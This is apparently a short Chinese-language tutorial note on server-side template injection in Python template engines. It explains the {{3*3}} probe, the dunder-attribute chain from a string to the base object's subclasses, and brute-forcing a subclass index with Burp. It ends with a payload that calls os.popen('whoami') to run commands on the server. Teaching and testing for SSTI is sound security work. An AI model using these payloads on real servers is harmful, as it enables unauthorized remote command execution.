#003
后续会写php介绍，类与对象的介绍
FSAZ 2023-11-10
什么是SSTI
当不正确的使用模板引擎进行渲染时，则会造成模板注入
类似于命令注入
模板注入的包裹符通常是
{{}}
{}
{%%}
http://127.0.0.1/{{3*3}}
http://127.0.0.1/?a={{3*3}}
{{3*3}}会被执行并返回9，称之为模板注入
在Python的ssti中，大部分是依靠基类->子类->危险函数的方式来利用ssti
基础概念:魔术方法的定义
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的
​__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用

"".__class__
先使用该payload来获取某个类，这里可以获取到的是str类，实际上获取到任何类都可以，因为我们都最终目的是要获取到基类Object
"".__class__.__bases__
"".__class__.__mro__[1]
获取其所有子类
"".__class__.__mro__[1].__subclasses__()
成功的话会返回类列表
利用[xxx]来调用特定类
这里我用burp来爆破303这个数字，从0爆破到一千来找利用类
"".__class__.__mro__[1].__subclasses__()[303].__init__.__globals__
().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr
最终poc类似于这样
{{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}